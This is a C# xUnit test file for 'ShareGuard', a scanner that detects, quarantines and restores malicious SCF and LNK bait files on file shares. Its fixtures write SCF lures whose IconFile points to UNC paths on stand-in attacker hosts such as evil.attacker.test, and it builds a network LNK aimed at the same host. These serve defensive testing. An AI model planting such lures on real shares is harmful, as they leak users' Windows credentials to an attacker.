using System.Text;
using ShareGuard.Core.Classification;
using ShareGuard.Core.Engine;
using ShareGuard.Core.Models;
using ShareGuard.Core.Parsers;
using ShareGuard.Core.Remediation;
using Xunit;

namespace ShareGuard.Tests;

public class ScannerEndToEndTests : IDisposable
{
    private readonly string _root;
    private readonly string _quarantine;

    public ScannerEndToEndTests()
    {
        _root = Path.Combine(Path.GetTempPath(), "shareguard-test-" + Guid.NewGuid().ToString("N"));
        _quarantine = Path.Combine(Path.GetTempPath(), "shareguard-quar-" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(_root);
        Directory.CreateDirectory(Path.Combine(_root, "sub", "deep"));
    }

    private static HostClassifier Classifier() => new(new AllowListConfig
    {
        AllowedSuffixes = ["corp.example.com"],
        AllowedCidrs = ["10.0.0.0/8", "192.168.0.0/16"],
    });

    [Fact]
    public async Task Scan_FindsExternalBait_AndLeavesBenignUntouched()
    {
        // 攻击诱饵:SCF 指向外部
        await File.WriteAllTextAsync(Path.Combine(_root, "bait.scf"),
            "[Shell]\nIconFile=\\\\evil.attacker.test\\share\\icon.ico\n");
        // 正常内部引用
        await File.WriteAllTextAsync(Path.Combine(_root, "normal.scf"),
            "[Shell]\nIconFile=\\\\filer.corp.example.com\\icons\\i.ico\n");
        // 深层 LNK
        await File.WriteAllBytesAsync(Path.Combine(_root, "sub", "deep", "x.lnk"),
            Support.LnkSampleBuilder.BuildNetworkLnk("evil.attacker.test", "p"));
        // 无关文件,必须被跳过
        await File.WriteAllTextAsync(Path.Combine(_root, "report.txt"), "nothing here");

        var parsers = new ParserRegistry();
        var analyzer = new FileAnalyzer(parsers, Classifier());
        var results = new System.Collections.Concurrent.ConcurrentBag<AnalysisResult>();
        var sink = results.Add;

        var stats = await new Scanner(analyzer, parsers).ScanAsync(
            new ScanOptions { Roots = [_root], Parallelism = 2 }, sink);

        Assert.Equal(3, stats.CandidateFiles);
        Assert.Equal(3, stats.FilesAnalyzed);
        Assert.Equal(2, stats.Malicious);
        Assert.Equal(1, stats.Benign);
        Assert.Equal(2, results.Count(r => r.Severity == Severity.Malicious));
        Assert.Contains(results, r => r.FilePath.EndsWith("bait.scf"));
        Assert.Contains(results, r => r.FilePath.EndsWith("x.lnk"));
    }

    [Fact]
    public async Task Scan_ResumesFromCheckpointWithoutReanalyzing()
    {
        var checkpoint = Path.Combine(_root, "cp.json");
        await File.WriteAllTextAsync(Path.Combine(_root, "a.scf"),
            "[Shell]\nIconFile=\\\\evil.attacker.test\\a\\i.ico\n");

        var parsers = new ParserRegistry();
        var analyzer = new FileAnalyzer(parsers, Classifier());
        var first = new List<AnalysisResult>();
        var stats1 = await new Scanner(analyzer, parsers).ScanAsync(
            new ScanOptions { Roots = [_root], CheckpointPath = checkpoint, Parallelism = 1 },
            first.Add);
        Assert.Equal(1, stats1.FilesAnalyzed);

        // 第二次扫描:根目录已在检查点中,直接跳过
        var second = new List<AnalysisResult>();
        var stats2 = await new Scanner(analyzer, parsers).ScanAsync(
            new ScanOptions { Roots = [_root], CheckpointPath = checkpoint, Parallelism = 1 },
            second.Add);
        Assert.Equal(0, stats2.FilesAnalyzed);
        Assert.Empty(second);
    }

    [Fact]
    public async Task Scan_MultipleRoots_AllAreCovered()
    {
        var rootA = Path.Combine(_root, "shareA");
        var rootB = Path.Combine(_root, "shareB");
        Directory.CreateDirectory(rootA);
        Directory.CreateDirectory(rootB);
        await File.WriteAllTextAsync(Path.Combine(rootA, "a.scf"),
            "[Shell]\nIconFile=\\\\evil-a.attacker.test\\s\\i.ico\n");
        await File.WriteAllTextAsync(Path.Combine(rootB, "b.scf"),
            "[Shell]\nIconFile=\\\\evil-b.attacker.test\\s\\i.ico\n");

        var parsers = new ParserRegistry();
        var analyzer = new FileAnalyzer(parsers, Classifier());
        var results = new System.Collections.Concurrent.ConcurrentBag<AnalysisResult>();
        var stats = await new Scanner(analyzer, parsers).ScanAsync(
            new ScanOptions { Roots = [rootA, rootB], Parallelism = 4, OnlyReportFindings = false },
            results.Add);

        Assert.Equal(2, stats.FilesAnalyzed);
        Assert.Equal(2, stats.Malicious);
        Assert.Contains(results, r => r.FilePath.EndsWith("a.scf"));
        Assert.Contains(results, r => r.FilePath.EndsWith("b.scf"));
    }

    [Fact]
    public async Task Quarantine_MovesFile_AndManifestEnablesRestore()
    {
        var baitPath = Path.Combine(_root, "bait.scf");
        await File.WriteAllTextAsync(baitPath, "[Shell]\nIconFile=\\\\evil.attacker.test\\s\\i.ico\n");

        var parsers = new ParserRegistry();
        var analyzer = new FileAnalyzer(parsers, Classifier());
        var result = analyzer.Analyze(baitPath);
        Assert.Equal(Severity.Malicious, result.Severity);

        var manager = new QuarantineManager(new QuarantineOptions { QuarantineRoot = _quarantine });
        var qr = await manager.QuarantineAsync(result);
        Assert.True(qr.Success);
        Assert.False(File.Exists(baitPath));
        Assert.True(File.Exists(qr.QuarantinedPath));
        Assert.True(File.Exists(baitPath + ".shareguard-quarantined.txt"));

        // manifest 可用于恢复
        var manifest = Directory.GetFiles(_quarantine, "manifest-*.jsonl").Single();
        var restore = await manager.RestoreAsync(manifest);
        Assert.True(restore.Success);
        Assert.True(File.Exists(baitPath));
    }

    [Fact]
    public async Task Scan_SmallQueue_ManyCandidates_DropsNothing()
    {
        // 回归:队列容量远小于候选数时,sync-over-async 阻塞曾导致枚举在
        // 约一个队列容量后停摆、静默丢文件。正确实现必须全量处理。
        const int n = 3000;
        var dir = Path.Combine(_root, "many");
        Directory.CreateDirectory(dir);
        for (var i = 0; i < n; i++)
        {
            await File.WriteAllTextAsync(Path.Combine(dir, $"f{i}.scf"),
                $"[Shell]\nIconFile=\\\\evil{i}.attacker.test\\s\\i.ico\n");
        }

        var parsers = new ParserRegistry();
        var analyzer = new FileAnalyzer(parsers, Classifier());
        // 并发消费者会在多线程上触发回调,普通 List<T> 非线程安全,必须用并发集合
        var results = new System.Collections.Concurrent.ConcurrentBag<AnalysisResult>();
        var stats = await new Scanner(analyzer, parsers).ScanAsync(
            new ScanOptions
            {
                Roots = [dir],
                Parallelism = 8,
                QueueCapacity = 16, // 刻意压到极小,强制频繁背压
                OnlyReportFindings = false,
            },
            results.Add);

        Assert.Equal(n, stats.FilesEnumerated);
        Assert.Equal(n, stats.CandidateFiles);
        Assert.Equal(n, stats.FilesAnalyzed);
        Assert.Equal(n, stats.Malicious);
        Assert.Equal(n, results.Count);
    }

    [Fact]
    public async Task Scan_ToleratesUnreadableFiles()
    {
        var baitPath = Path.Combine(_root, "bait.scf");
        await File.WriteAllTextAsync(baitPath, "[Shell]\nIconFile=\\\\evil.attacker.test\\s\\i.ico\n");

        FileStream? lockHandle = null;
        var previousMode = UnixFileMode.None;
        try
        {
            if (OperatingSystem.IsWindows())
            {
                // Windows:独占锁(不共享读),FileStream 打开即触发 IOException
                lockHandle = new FileStream(baitPath, FileMode.Open, FileAccess.Read, FileShare.None);
            }
            else
            {
                // Unix:去掉所有读权限;非 root 运行时读取即 PermissionDenied
                previousMode = File.GetUnixFileMode(baitPath);
                File.SetUnixFileMode(baitPath, UnixFileMode.UserWrite | UnixFileMode.GroupWrite | UnixFileMode.OtherWrite);
                if (getuid() == 0) return; // root 绕过权限位,此环境无法模拟,跳过
            }

            var parsers = new ParserRegistry();
            var analyzer = new FileAnalyzer(parsers, Classifier());
            var results = new List<AnalysisResult>();
            var stats = await new Scanner(analyzer, parsers).ScanAsync(
                new ScanOptions { Roots = [_root], Parallelism = 1 },
                results.Add);

            Assert.Equal(1, stats.AccessErrors);
        }
        finally
        {
            lockHandle?.Dispose();
            if (!OperatingSystem.IsWindows() && previousMode != UnixFileMode.None)
                File.SetUnixFileMode(baitPath, previousMode);
        }
    }

    [System.Runtime.InteropServices.DllImport("libc")]
    private static extern uint getuid();

    public void Dispose()
    {
        try { Directory.Delete(_root, recursive: true); } catch { /* ignore */ }
        try { Directory.Delete(_quarantine, recursive: true); } catch { /* ignore */ }
    }
}
